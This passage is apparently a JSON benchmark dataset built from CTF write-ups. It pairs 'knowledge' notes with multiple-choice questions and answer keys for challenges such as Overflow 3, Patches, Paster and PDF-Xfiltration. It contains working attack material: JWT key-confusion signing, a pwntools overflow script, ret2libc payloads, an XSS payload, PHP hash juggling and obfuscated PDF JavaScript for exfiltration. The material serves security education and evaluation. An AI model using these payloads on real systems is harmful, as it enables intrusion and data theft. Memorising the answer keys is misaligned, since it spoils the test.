            "When dealing with JWT authentication in a challenge, if a public key is provided (usually found in hidden files like `robots.txt`), it suggests that a JWT key confusion attack may be possible. This involves changing the JWT header to use HS256 algorithm instead of RS256, tricking the server into validating a crafted JWT with a symmetric key derived from the public key. This can elevate privileges or bypass authentication if the payload is altered appropriately.  \n**Condition for use:** A public key is accessible and you can intercept or modify JWT tokens being sent to the server.  \n**Example payload alteration:** Changing `\"type\": \"user\"` to `\"type\": \"admin\"` in the JWT payload.",
            "To perform a JWT key confusion attack, after modifying the JWT header and payload, you need to create a signature using the public key as a symmetric key. This is achieved by using HMAC SHA256, with the public key as the secret. The signature is then appended to the crafted JWT part, completing the token which can then be used for authentication as an admin user.  \n**Condition for use:** JWT key confusion attack is applicable, and you have the necessary tools to modify and encode JWT tokens.  \n**Example signature generation:** Using OpenSSL:  \n```sh\nopenssl dgst -sha256 -mac HMAC -macopt hexkey:$(cat signing.pem | xxd -p | tr -d \"\\\\n\")\n```  \nAnd then base64 URL encode the resulting signature to append to the JWT."
        ],
        "question": [
            "In a scenario where one intercepts a JWT token and has access to a public RSA key from the server, which technique should be employed to potentially elevate privileges or gain unauthorized access, considering the JWT uses RS256 for its signature algorithm?  - A. Modify the JWT payload to include privileges or roles not assigned to the user and resend the token as is. - B. Change the JWT header algorithm from RS256 to HS256, use the public key as a symmetric key to sign the token, and alter the payload to include elevated privileges. - C. Encrypt the entire JWT token using the public RSA key and resend it for elevated access. - D. Increase the expiration time of the JWT token to extend its validity and resend it for prolonged access. ",
            "Once the JWT header and payload have been modified for a key confusion attack, which command correctly generates the new signature required to authenticate as an admin user, given the public RSA key is available and being treated as a symmetric key for the HMAC SHA256 algorithm?  - A. `openssl rsa -pubin -in signing.pem -text` - B. `cat signing.pem | base64` - C. `openssl dgst -sha256 -mac HMAC -macopt hexkey:$(cat signing.pem | xxd -p | tr -d \"\\\\n\")` - D. `ssh-keygen -y -f signing.pem` "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Over the Wire (part 1)",
        "write_up": "dataset/raw/Over the Wire (part 1).md",
        "type": "crypto",
        "competition": [
            "1337UP/2023",
            "https://ctftime.org/event/2134/tasks/"
        ],
        "score": -1,
        "max_score": 50,
        "difficulty": -1,
        "knowledge": [
            "When dealing with encrypted files in cybersecurity challenges, especially when the file is a zip format requiring a password, conducting a thorough inspection of communications captured in network traffic (i.e., PCAP files) can reveal hints or explicit mentions of passwords. This involves searching for keywords like \"password\" within the packets using tools like Wireshark. If direct searches do not yield the password, additional hints provided in the communications can guide the correct context or modifications needed for the password.",
            "If initial attempts to use a discovered password fail, consider contextual hints suggesting the need for updating or modifying the password before trying again. In scenarios where a password includes elements that could vary over time (such as a year), incrementing these elements to the current or next logical value can be a successful strategy. This approach is particularly useful in situations where the communication hints at such alterations, reflecting a common practice of users updating passwords based on temporal context but maintaining a base pattern for memorability.\n\nExample of updating a password for access: If the original password is \"password_2022\", and a hint suggests \"updating it accordingly\", an updated attempt might be \"password_2023\" to gain access to encrypted files."
        ],
        "question": [
            "When attempting to extract a flag from a zip file captured in network traffic analysis, which technique is the best to find the required password if a direct search for \"password\" yields no results? - A. Search for FTP packets specifically, as FTP transmissions often contain credentials. - B. Decode each packet manually until the password is revealed. - C. Filter for HTTP packets, as they are more likely to contain passwords. - D. Guess the password based on the encryption algorithm of the zip file. ",
            "In a scenario where a password extracted from network traffic fails to unlock an encrypted zip file, and the discovered password ends in a year (e.g., 5up3r_53cur3_p455w0rd_2022), which approach should be considered based on contextual hints suggesting an update? - A. Reversing the current year in the password (e.g., 2202). - B. Incrementing the year in the password to the next year (e.g., 5up3r_53cur3_p455w0rd_2023). - C. Removing the year from the password entirely. - D. Changing the password to the current date. "
        ],
        "answer": [
            "A",
            "B"
        ]
    },
    {
        "name": "Over the Wire (part 2)",
        "write_up": "dataset/raw/Over the Wire (part 2).md",
        "type": "crypto",
        "competition": [
            "1337UP/2023",
            "https://ctftime.org/event/2134/tasks/"
        ],
        "score": -1,
        "max_score": 50,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving network packet analysis, specifically when a PCAP file is given, searching for strings related to the storyline or challenge description can lead to important discoveries. Use filters for specific protocols or formats like 'imf' to narrow down packets related to the clue or communication format mentioned in the challenge. This can reveal hidden or obfuscated communications, leading to the next steps or the required information to solve the challenge.",
            "When working with challenges related to data hidden within files, particularly images, considering steganography techniques like the Least Significant Bit (LSB) method can be crucial. Tools such as Stegsolve can be used to analyze and extract data hidden via steganography in images. This method relies on altering the least significant bits of the pixel values in an image to encode data. The visual change is minimal and often imperceptible to the naked eye, making it a popular method for hiding data within files. \n\n   Example technique for data extraction using LSB:\n   - Use a tool like Stegsolve.\n   - Navigate to 'Data Extract' and select all 0 bits for each of the color channels (Red, Green, Blue).\n   - Analyze the hex dump or output data for potential hidden information or flags."
        ],
        "question": [
            "When examining a PCAP file in a cybersecurity challenge, which of the following approaches is recommended to uncover important clues or hidden information based on the challenge's narrative? - A. Use a hex editor to manually inspect the hexadecimal representation of each packet. - B. Strictly focus on DNS queries to find hidden messages. - C. Search for strings related to the storyline or challenge description and use protocol-specific filters like 'imf' to narrow down relevant communications. - D. Decode all packet data using base64 decoding without filtering or searching for specific content.",
            "In the context of hiding data within image files, which method is described for extracting hidden information using steganography techniques, specifically referencing the use of a popular tool and its functionality? - A. Encrypt the entire image with a symmetric key and analyze the ciphertext. - B. Utilize a tool like Stegsolve, navigate to 'Data Extract', select all 0 bits for each of the color channels to analyze and extract potentially hidden data. - C. Perform an MD5 hash of the image file and compare it to known hashes of the original images. - D. Increase the brightness and contrast of the image to visually identify hidden text or data."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Overflow 3",
        "write_up": "dataset/raw/Overflow 3.md",
        "type": "pwn",
        "competition": [
            "CyberYoddha/2020",
            "https://ctftime.org/event/1169/tasks/"
        ],
        "score": 250,
        "max_score": 900,
        "difficulty": 0.2777777777777778,
        "knowledge": [
            "In buffer overflow challenges where the goal is to overwrite a specific variable to achieve a condition, determine the buffer size and the distance to the target variable to construct the payload accurately. In this scenario, the buffer is of size 16 bytes, and the target variable `vuln` is positioned after the buffer. It requires padding the payload with enough bytes (in this case \"A\"*28) to reach the target variable's memory location and then appending the target value.\n   Example payload: `\"A\"*28 + p32(0xd3adb33f)`",
            "To interact with a remote service and exploit buffer overflow vulnerabilities, use scripting with libraries like pwntools. This simplifies the process of sending payloads and interacting with the service. The example script uses `remote` to connect to the service, `sendline` to send the exploit payload, and `interactive` to engage with the service after exploitation.\n   Example usage: \n   ```python\n   from pwn import *\n   s = remote(\"cyberyoddha.baycyber.net\", 10003)\n   payload = \"A\"*28 + p32(0xd3adb33f)\n   s.sendline(payload)\n   s.interactive()\n   ```"
        ],
        "question": [
            "In a scenario involving a buffer overflow where the objective is to overwrite a specific variable, if the buffer is defined with a size of 16 bytes, how many additional bytes would be required to reach and overwrite a subsequent `long` type variable to trigger a desired condition? - A. 28 bytes - B. 16 bytes - C. 8 bytes - D. 4 bytes",
            "When exploiting a buffer overflow vulnerability and needing to interact with a remote service, which combination of functions from the pwntools library should be used to connect to the service, send the exploit payload, and then interact with it? - A. `remote()`, `send()`, `interactive()` - B. `connect()`, `sendline()`, `console()` - C. `remote()`, `sendline()`, `interactive()` - D. `dial()`, `transmit()`, `control()`"
        ],
        "answer": [
            "A",
            "C"
        ]
    },
    {
        "name": "papa bear",
        "write_up": "dataset/raw/papa bear.md",
        "type": "crypto",
        "competition": [
            "HackTM/2020/Quals",
            "https://ctftime.org/event/956/tasks/"
        ],
        "score": 482,
        "max_score": 500,
        "difficulty": 0.964,
        "knowledge": [
            "In challenges focusing on reverse engineering where the algorithm modifies output based on input in a predictable manner, an effective approach can be to implement an iterative brute-force attack. This attack method involves trying every possible character in the input one by one and analyzing the changes in the output to determine which characters produce a desired change, like flipping \"M\" into \"W\". The key knowledge here is to use a scoring function that counts the number of correct characters in the output compared to a target or reference output. This approach allows for incrementally building up a correct input (the flag) without fully understanding the underlying algorithm. Example approach: For each character in the input, run the binary with the current guess of the flag, compare the output to the expected output, and measure how closely they match using a scoring function.",
            "When a binary or application writes output to an unusual file descriptor such as fd 0 (standard input) instead of the expected fd 1 (standard output) or fd 2 (standard error), a workaround is to redirect the output from the unexpected file descriptor to a standard one. This can be critical for capturing and processing the output in automated scripts or during reverse engineering efforts. Example correction in script: using `0>&1` in the command line (e.g., `./binary 0>&1`) to redirect fd 0 to fd 1, allowing the capturing of the binary's output for further processing or analysis."
        ],
        "question": [
            "In a reverse engineering challenge, when determining the correct input based on changes observed in the output, which approach can be an effective way to incrementally find the correct sequence of characters? - A. Use a scoring function to compare the output directly with the expected output, incrementing with each correct character added. - B. Randomly guess the entire input sequence without observing the output. - C. Only consider the first character of the input and ignore further output. - D. Change the internal state of the binary directly without running it.",
            "When a binary writes output to file descriptor 0 instead of the standard output or error, which command can correctly redirect the output to allow capturing and analysis in scripts? - A. `./binary > output.txt` to capture standard output. - B. `./binary 2>&1` to mix standard error with standard output. - C. `./binary 0>&1` to redirect fd 0 to fd 1, capturing the output correctly. - D. `./binary &> /dev/null` to discard all output."
        ],
        "answer": [
            "A.",
            "C."
        ]
    },
    {
        "name": "Parsey Mcparser",
        "write_up": "dataset/raw/Parsey Mcparser.md",
        "type": "This challenge falls under the category of \"forensics\" as it involves analyzing a blob of data with an unknown format to extract specific information (user_names) based on the group they belong to.",
        "competition": [
            "Tenable/2021",
            "https://ctftime.org/event/1266/tasks/"
        ],
        "score": 50,
        "max_score": 250,
        "difficulty": 0.2,
        "knowledge": [
            "When faced with data in a non-standard format that includes identifiable key-value pairs, such conversion into a structured format like JSON objects facilitates easier manipulation and data extraction. This approach is particularly useful for parsing and analyzing semi-structured data where regular expressions might be too complex or inefficient. Example transformation snippet: \n```python\nimport json\n\nentry = '''[\"age\":39, \"user_name\":\"Reid Jolley\", \"Group\":\"Black\"]'''\nentry_fixed = entry.replace('\":', '\": \"').replace(', \"', '\", \"')\njson_object = json.loads(entry_fixed)\n```",
            "Once the data is structured (e.g., JSON objects), it's straightforward to implement filtering based on specific criteria, such as grouping or category. This is applicable in scenarios where data needs to be segmented or categorized for further analysis or processing. Example filtering code:\n```python\ndef filter_users_by_group(users_json, group_name):\n    return [user['user_name'] for user in users_json if user['Group'] == group_name]\n```"
        ],
        "question": [
            "In a scenario where you have a string representation of a key-value pair with irregular formatting, which Python code snippet correctly demonstrates the transformation of this string into a JSON object for easy data manipulation?  - A. ```python entry = '''[\"age\":39, \"user_name\":\"John Doe\", \"Group\":\"Blue\"]''' entry_fixed = entry.replace(': ', ': \"').replace(', ', '\", ') json_object = json.loads(entry_fixed) ``` - B. ```python import json entry = '''[\"age\":39, \"user_name\":\"John Doe\", \"Group\":\"Blue\"]''' entry_fixed = entry.replace('\":', '\": \"').replace(', \"', '\", \"') json_object = json.loads(entry_fixed) ``` - C. ```python entry = '''[\"age\":39, \"user_name\":\"John Doe\", \"Group\":\"Blue\"]''' entry_fixed = entry.replace(':', ': ').replace(', ', ', ') json_object = json.loads(entry_fixed) ``` - D. ```python import json entry = '''[\"age\":39, \"user_name\":\"John Doe\", \"Group\":\"Blue\"]''' entry_fixed = entry.replace(':', '::').replace(',', ',,') json_object = json.loads(entry_fixed) ```",
            "Considering a function designed to filter user information from a list of JSON objects based on group membership, which implementation correctly returns a list of user names for a specified group?  - A. ```python def filter_users_by_group(users_json, group_name): return [user['user_name'] for user in users_json if user['Group'].lower() == group_name.lower()] ``` - B. ```python def filter_users_by_group(users_json, group_name): return user['user_name'] for user in users_json if user['Group'] == group_name ``` - C. ```python def filter_users_by_group(users_json, group_name): return [user['user_name'] for user in users_json] ``` - D. ```python def filter_users_by_group(users_json, group_name): return [user['user_name'] for user in users_json if user['Group'] == group_name] ```"
        ],
        "answer": [
            "B.",
            "D."
        ]
    },
    {
        "name": "party",
        "write_up": "dataset/raw/party.md",
        "type": "reverse",
        "competition": [
            "ASIS/2019/Quals",
            "https://ctftime.org/event/732/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When analyzing reverse engineering challenges, especially those involving data structures, it's crucial to closely examine the operations performed on these structures. In the context of a challenge that utilizes operations similar to doubly linked lists or dancing links (DLX) to implement Algorithm X for solving exact cover problems, reverse engineers should:\n   - Identify the data structure based on the memory operations and their sequence. In instances resembling doubly linked list manipulations or DLX algorithm applications, expect the challenge to relate to Algorithm X or exact cover problem-solving strategies.\n   - Utilize IDA or similar tools to define structures and rename variables for clearer understanding. This approach aids in recognizing algorithm implementations and their purpose within the challenge.\n   - Example Approach: Define a `Person` structure in IDA when you detect sequential pointer modifications that hint at linked list operations.",
            "For reverse engineering challenges that employ hash functions to validate input or process data within constraints, reverse engineers can deconstruct the hash function's logic to reverse the hashing process or determine the input characteristics. Given a scenario where the hash function outputs a specific value based on the input set's order and size, the technique involves:\n   - Analyzing the hash function to understand how it iterates over the input and calculates the result. This includes breaking down the loop logic and arithmetic operations applied to each element or subset of the input.\n   - Employing mathematical or logical deductions to reverse engineer the expected input format from the desired hash output. This may involve operations such as division sequences that suggest an array's construction method or order.\n   - Example Technique: To reverse a complex hash function, iterate over potential input lengths and apply derived operations (like those matching the hash algorithm's structure) to backtrack to a possible input order or composition."
        ],
        "question": [
            "In a reverse engineering challenge, if you encounter a complex function `0x4019a0 party()` that manipulates a structure resembling operations on a doubly linked list or dancing links algorithm (DLX), which implementation is primarily aimed to solve: - A. Sorting algorithms efficiency enhancement. - B. Exact cover problems using Algorithm X. - C. Encryption algorithms for secure data transmission. - D. Compression algorithms for reducing data size.",
            "When reverse-engineering a hash function like `hash()` that iterates over an input vector and produces a specific output (e.g., `0xf6bb10ed6`), which method is effective for understanding the input's required order or characteristics? - A. Translating the hash function into a high-level language pseudocode to simplify understanding. - B. Observing the hash function\u2019s loop and conditional statements to guess the input length. - C. Dividing the hash output by sequential numbers to deduce the input array before compression. - D. Applying reverse cryptographic methods to decrypt the hash output directly into input data."
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "Password 3",
        "write_up": "dataset/raw/Password 3.md",
        "type": "The type of this CTF challenge is **crypto**.",
        "competition": [
            "CyberYoddha/2020",
            "https://ctftime.org/event/1169/tasks/"
        ],
        "score": 225,
        "max_score": 900,
        "difficulty": 0.25,
        "knowledge": [
            "When facing a challenge involving encryption or encoding techniques, if the algorithm appears to be reversible (like XOR operations), reverse-engineering the process can effectively reveal the plaintext. This approach involves analyzing the code to understand the operations applied to the input and applying the inverse operations to the encoded or encrypted output. This method is particularly useful in CTF challenges where custom encryption algorithms are used, and the key or method of encryption is provided within the challenge itself.",
            "When the challenge involves base64 encoding following an XOR operation, first decode the base64 encoded string to get the XORed bytes. Then, apply the XOR operation with the same key used in the encryption process to get the original text. This approach is applicable to scenarios where the encryption process involves an XOR operation followed by base64 encoding. The steps include base64 decoding followed by XOR decryption with the specified key. \n    - Example payload to reverse the process:\n        ```python\n        base64_string = \"encoded_string_here\"\n        key = 0x55  # The XOR key used in the encryption process\n        base64_bytes = base64.b64decode(base64_string)\n        original_text = ''.join(chr(byte ^ key) for byte in base64_bytes)\n        print(original_text)\n        ```"
        ],
        "question": [
            "In a cybersecurity challenge, you're given a piece of Python code where an input string is first XOR encrypted with a single byte and then encoded in base64. If you wish to reverse the process to retrieve the original input, which of the following steps should you take first? - A. Perform base64 encoding on the encrypted string. - B. Directly apply the XOR operation with the key to the base64 encoded string. - C. Decode the string from base64 and then apply the XOR operation with the same key. - D. Encrypt the base64 string again using a different XOR key.",
            "When analyzing a Python script used in a CTF challenge that employs an XOR operation with a fixed key on an input string followed by base64 encoding, which Python function would be essential to invert the XOR operation to reveal the original string? - A. ''.join(chr(ord(char) / 0x55) for char in inputString) - B. ''.join(chr(ord(char) ^ 0x55) for char in inputString) - C. base64.b64decode(inputString).decode(\"ascii\") - D. base64.b64encode(inputString).encode(\"ascii\")"
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Password",
        "write_up": "dataset/raw/Password.xls.md",
        "type": "crypto",
        "competition": [
            "AUCTF/2020",
            "https://ctftime.org/event/1020/tasks/"
        ],
        "score": -1.0,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "When analyzing a binary for encryption-related functionality, identifying unique strings or \"magic strings\" within the binary can lead to discovering the handler function and understanding the encryption method used. In scenarios where the binary is suspected to employ encryption or obfuscation, searching for strings related to known encryption tools or custom identifiers within the file can guide analysts directly to relevant code sections handling encryption or decryption processes.",
            "In scenarios involving encrypted data with known or predictable plaintext patterns (such as file headers or repetitive data blocks in the case of certain file formats), the CFB (Cipher Feedback) mode of operation can allow for piecing together parts of the plaintext without having the encryption key. This is possible because CFB uses the previous ciphertext block to encrypt the next block, meaning if an attacker knows or can guess the plaintext of one block, they can decipher subsequent blocks. This method is particularly useful when dealing with encrypted file formats that have predictable content, such as headers or templates that follow a specific structure.\n   \n   Example calculation revealing part of the plaintext without the key:  \n   ```python\n   enciv = bytearray(16)  \n   for i in range(16):  \n       enciv[i] = data[100+i] ^ 0xFF  \n   for i in range(len(data) // 100):  \n       dec = bytes(data[i*100 + j] ^ enciv[j] for j in range(16))  \n       dec_printable = ''.join(chr(x) if 0x20 <= x <= 0x7E else '.' for x in dec)  \n       print(dec.hex(), dec_printable)\n   ```"
        ],
        "question": [
            "When investigating a Win32 binary for encryption processes, how can identifying \"magic strings\" be useful? - A. They help in modifying the binary's execution flow to prevent encryption. - B. Magic strings indicate the start of data blocks, removing the need to understand encryption. - C. They serve as direct indicators to functions handling encryption, simplifying the identification of the encryption algorithm and process. - D. They can be used to decrypt data without needing the key.",
            "How does the Cipher Feedback (CFB) mode of operation facilitate decryption of certain encrypted data blocks without the encryption key? - A. By using the encryption key in clear text within the binary, making direct decryption possible. - B. Through predictive encryption which negates the need for decryption. - C. CFB allows for the decryption of some blocks if the plaintext of a preceding block is known, leveraging the dependency of each block's encryption on the previous ciphertext block. - D. It encrypts each block with a separate key derived from the binary, making decryption straightforward."
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "Paster",
        "write_up": "dataset/raw/Paster.md",
        "type": "web",
        "competition": [
            "HackPack/2020",
            "https://ctftime.org/event/1036/tasks/"
        ],
        "score": 100,
        "max_score": 497,
        "difficulty": 0.2012072434607646,
        "knowledge": [
            "When facing a Cross-Site Scripting (XSS) challenge, specifically where the goal is to execute JavaScript on a webpage, use simple payloads that inject JavaScript code directly into the HTML. Events like `onload` for SVG tags can trigger JavaScript execution. Example payload: `<svg/onload=alert(1)>`",
            "In challenges involving PHP hash comparisons where the hash starts with \"0e\" and is followed by digits, leverage PHP's type juggling vulnerability. This occurs because PHP treats strings starting with \"0e\" followed by numbers as scientific notation, equating them to 0. Find a string whose MD5 hash also starts with \"0e\" and is followed by digits to bypass the weak comparison. Example combination: `240610708`, since `md5('240610708') == \"0e....\"` which PHP interprets as 0, passing the weak type comparison."
        ],
        "question": [
            "In a scenario where you need to perform an XSS attack against a web application, which of the following payloads would effectively execute JavaScript within the context of the web page, particularly using an SVG tag to trigger the JavaScript execution upon page load?  - A. `<script>console.log('XSS')</script>` - B. `<svg/onload=alert(1)>` - C. `<iframe src=\"javascript:alert(1)\"></iframe>` - D. `<div onclick=alert(1)>Click me!</div>` ",
            "When attempting to exploit a PHP application that uses loose comparison (==) to compare a user input to a hash value starting with \"0e\" followed by digits, which of the following inputs would be considered equivalent to the hash due to PHP's type juggling, thus allowing bypassing the hash comparison?  - A.  `0e215962017` - B.  `240610708` - C.  `0` - D.  `123456` "
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "Patches",
        "write_up": "dataset/raw/Patches.md",
        "type": "reverse",
        "competition": [
            "BSidesBOS/2020",
            "https://ctftime.org/event/1125/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "In a binary exploitation challenge, if the binary has a 'gets' or similar function that allows for a buffer overflow, and the binary includes useful gadgets like 'pop rdi; ret', these can be leveraged in a Ret2Libc attack to first leak a libc address (such as 'puts') to calculate the libc base address, then execute a system call (like 'execve') to spawn a shell. When constructing the payload for such attacks, gadgets can be used to manipulate the stack to control function arguments in a way that bypasses protections like ASLR.\n   - Example of a payload snippet for leaking an address: `payload = JUNK + p64(pop_rdi) + p64(got_puts) + p64(plt_puts) + p64(main)`\n   - Example of a payload snippet for spawning a shell: `payload = JUNK + p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(0) * 2 + p64(execve)`",
            "During binary analysis and reverse-engineering tasks, when encountering a binary that doesn't provide an obvious way to reach a desirable function (such as a function that would print out a flag), setting a breakpoint on the return (ret) instruction of a function and modifying the instruction pointer (RIP) value to point to the desirable function\u2019s address can force the program flow to jump to that function, thus executing it. This method can unlock or reveal hidden functionality within a binary without needing to understand or navigate through the entire program logic.\n   - Example of modifying `rip` in gdb: `set $rip = 0x0000555555555261`"
        ],
        "question": [
            "In the context of a Ret2Libc attack where a buffer overflow vulnerability exists, and specific gadgets are utilized to manipulate the stack and bypass protections, which of the following payloads correctly demonstrates the construction process for leaking an address to then calculate the libc base address? - A. `payload = JUNK + p64(pop_rsi) + p64(got_puts) + p64(plt_puts) + p64(main)` - B. `payload = JUNK + p64(pop_rdi) + p64(got_puts) + p64(plt_puts) + p64(main)` - C. `payload = JUNK + p64(pop_rdx) + p64(got_puts) + p64(plt_puts) + p64(main)` - D. `payload = JUNK + p64(push_rdi) + p64(got_puts) + p64(plt_puts) + p64(main)` ",
            "During reverse engineering of a binary that doesn't straightforwardly yield its secrets, such as printing out a flag, which gdb command correctly alters the execution flow to jump to a desired function (\"print_flag\" for instance) after hitting a breakpoint on the `ret` instruction of another function, effectively unlocking hidden functionality? - A. `set $eip = 0x0000555555555261` - B. `jump *0x0000555555555261` - C. `set $rip = 0x0000555555555200` - D. `set $rip = 0x0000555555555261` "
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Patience",
        "write_up": "dataset/raw/Patience.md",
        "type": "forensics",
        "competition": [
            "BalCCon/2020",
            "https://ctftime.org/event/1100/tasks/"
        ],
        "score": 474,
        "max_score": 497,
        "difficulty": 0.9537223340040242,
        "knowledge": [
            "When encountering a challenge that indicates a timing channel vulnerability, consider the possibility of information being transmitted through variances in response times. This approach is especially relevant in scenarios where seemingly indistinguishable behaviour hides subtle differences. These differences in timings can be decoded using a scheme, such as interpreting the delays as Morse code, where long delays represent dashes, medium delays dots, and short delays spaces.",
            "For challenges involving lazy evaluation languages like Haskell, where the evaluation is deferred until the result is absolutely needed, it's crucial to understand that the apparent complexity of language constructs can often be bypassed or significantly reduced by identifying and focusing on the evaluation strategy or the lack thereof. Memorization or memoization techniques can be particularly effective in optimizing performance by caching the results of expensive function calls. Sample in Haskell, demonstrating the use of memoization:\n\n```haskell\nimport Data.Function.Memoize\n\nfsize :: Int -> Integer  \nfsize = memoize fsize'\n\nfsize' :: Int -> Integer  \nfsize' 0 = fromIntegral $ length s0  \nfsize' i = 2 * fsize (i - 1) + 3 * fsize 0\n```\n\nThis technique can be applied universally to optimize recursive calls that re-compute the same results in lazy evaluated languages, reducing the computational complexity from exponential to linear or near-linear in many cases."
        ],
        "question": [
            "In a cybersecurity challenge, a team noticed varying HTTP server response times\u2014sometimes around 100 ms, other times around 600 ms, and occasionally about 1100 ms. To transmit hidden information through these timings, which method closely resembles decoding these variations? - A. Interpreting different response times as binary code, where each timing represents a 0 or 1. - B. Assigning each unique response time a different alphabet letter or symbol. - C. Using the response times as Morse code, where delay >1000 ms is a space, delay >500 ms is a dash `-`, and delay ~100 ms is a dot `.`. - D. Treating the response times as ASCII values, converting each timing directly to a character based on its millisecond value. ",
            "In a Haskell challenge, a function `fsize` is utilized to calculate string lengths in a recursive manner with each subsequent call. The initial version suffered from poor performance due to repeated calculations of the same values. Which Haskell feature can optimize this function by avoiding recalculations and caching the results of expensive function calls? - A. Using `let` bindings to store the interim results of function calls. - B. Implementing pattern matching to reduce the complexity of `fsize` calculations. - C. Employing memoization, specifically through the `memoize` function, to cache the results of `fsize` and avoid redundant computations. - D. Refactoring the recursive calls into a list comprehension to implicitly handle caching through Haskell's internal mechanisms. "
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "PCaS",
        "write_up": "dataset/raw/PCaS.md",
        "type": "This challenge is of the reverse type.",
        "competition": [
            "CyberSecurityRumble/2023/Quals",
            "https://ctftime.org/event/1942/tasks/"
        ],
        "score": 600,
        "max_score": 1000,
        "difficulty": 0.6,
        "knowledge": [
            "In challenges involving concurrent programming or multi-threading vulnerabilities, identifying race conditions can be crucial for exploitation. If the application logic does not properly handle concurrent requests, especially in systems designed to process tasks sequentially, it may lead to overlapping or incorrect data processing. This can be exploited by simultaneously initiating multiple instances or requests to interfere with the application's intended flow. The race condition in the described challenge was leveraged by starting the loading of multiple planes nearly at the same time, leading to an incorrect loading configuration being applied across different sessions.",
            "When dealing with challenges that involve time-based or computationally intensive tasks, such as solving a knapsack problem within a certain time frame, one can strategize by manipulating the input to control the difficulty of the task for the application. In the challenge, the exploit involves sending specifically crafted payloads that adjust the max weight and number of containers per plane to manipulate the difficulty of the underlying knapsack problem. Setting up the conditions so that one request forces the application into a longer, more intensive computation, while others are designed for quick resolution, can exploit time-based logic or processing flaws to achieve an undesired state in the application (e.g., overloading a plane).\n\nExample payload strategy for manipulating task difficulty:\n- For connections meant to consume more time: Send plane data with a small max weight and a full number of containers, crafting a problem that is near the limit of the computational timeout.\n- For connections designed for quick resolution: Send plane data with the minimum possible number of containers and set all to max weight, ensuring the problem is solved quickly and sets the result prematurely for all planes due to the race condition."
        ],
        "question": [
            "In a .NET Core C# application with a multi-threaded architecture, if the application processes tasks that should be handled sequentially but does not adequately mitigate race conditions, how can an attacker exploit this vulnerability to cause unintended behavior?  - A. By sending sequential requests to the application, ensuring each task is completed before the next begins. - B. By initiating multiple instances or requests simultaneously to interfere with the sequential flow, leading to overlapping or incorrect data processing. - C. By avoiding concurrent requests altogether, to not trigger any potential race conditions. - D. By waiting for one thread to complete its execution before starting another, ensuring no race condition is possible. ",
            "In the context of exploiting a computationally intensive task within a .NET Core C# application, which technique would effectively manipulate the difficulty of the task to exploit time-based logic or processing flaws?  - A. Solving the computational task externally and submitting the solution to bypass the application's processing. - B. Sending requests with data designed to bypass the computation altogether, relying on default values to pass through the logic checks. - C. Sending specifically crafted payloads that adjust variables (e.g., max weight, number of containers per plane) to manipulate the complexity of the task, allowing for control over the application's processing time and outcome. - D. Increasing the computational resources available to the application, making all tasks complete quicker and preventing any exploitation of time-based logic. "
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "PDF-Xfiltration",
        "write_up": "dataset/raw/PDF-Xfiltration.md",
        "type": "web",
        "competition": [
            "insomnihack/2022/Quals",
            "https://ctftime.org/event/1505/tasks/"
        ],
        "score": 451,
        "max_score": 451,
        "difficulty": 1.0,
        "knowledge": [
            "If a Capture The Flag (CTF) challenge involves analyzing or manipulating PDF files, understand that PDFs have both encrypted and unencrypted parts; only parts of the PDF are encrypted whereas the unencrypted parts can be freely modified without affecting the encrypted content. This property can be exploited by adding custom JavaScript code to the unencrypted parts to exfiltrate data. This approach utilizes the fact that certain PDF reader applications, including older versions, execute JavaScript code embedded within PDFs, potentially leaking sensitive information when the document is opened.",
            "When direct execution methods or straightforward payloads are blocked or ineffective due to security measures in a CTF challenge involving PDF files (such as blacklists or filters preventing XXE attacks or JavaScript execution), leverage more indirect or obfuscated techniques for code execution and data exfiltration. This can involve using alternative features of the PDF, such as embedded files or annotations, that can still be manipulated to execute JavaScript. Obfuscating JavaScript function calls (e.g., breaking up strings to bypass simple text matching in filters) can evade simple security measures, allowing the execution of custom scripts to exfiltrate data securely.\n\nExample payload for obfuscating JavaScript calls to bypass filters: `util.stringFromStream(this[\"getDat\" + \"aObje\" + \"ctContents\"](\"x\",true))`."
        ],
        "question": [
            "In a Capture The Flag (CTF) challenge, when dealing with PDF files, knowing which part of the PDF structure can be manipulated to inject malicious JavaScript without altering the encrypted data is crucial. Which part of the PDF file structure allows for such manipulation? - A. The binary data within the PDF stream objects - B. The encrypted metadata in the PDF header - C. Unencrypted parts of the PDF, such as custom JavaScript code in the document's open actions - D. The cross-reference table and trailer section of the PDF",
            "In the context of a CTF challenge involving the manipulation of PDF files to bypass security measures like blacklists or filters, which method is an effective approach to obfuscate JavaScript function calls and evade simple text matching? - A. Encrypting the entire PDF file including the malicious JavaScript to avoid detection - B. Utilizing complex Regular Expressions to dynamically generate JavaScript code at runtime - C. Splitting the string representation of function names and concatenating them at runtime, e.g., `util.stringFromStream(this[\"getDat\" + \"aObje\" + \"ctContents\"](\"x\",true))` - D. Embedding the JavaScript in images or other binary data within the PDF"
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Peculiar gifts",
        "write_up": "dataset/raw/Peculiar gifts.md",
        "type": "misc",
        "competition": [
            "X-MAS/2020",
            "https://ctftime.org/event/1209/tasks/"
        ],
        "score": 462,
        "max_score": 500,
        "difficulty": 0.924,
        "knowledge": [
            "In challenges categorized under \"Misc\" with attached image files, initially explore the possibility of steganography for hiding information. Tools such as Steghide can be employed for extracting hidden data from jpeg files. However, extraction using tools like Steghide usually requires a password. Creative guessing or context clues (e.g., using the file name or related text as the password) may reveal the password for decryption.\n\n   Example payload for extracting data with Steghide using a password: `steghide --extract -sf XMAS.jpeg -xf output.txt -p \"XMAS\"`",
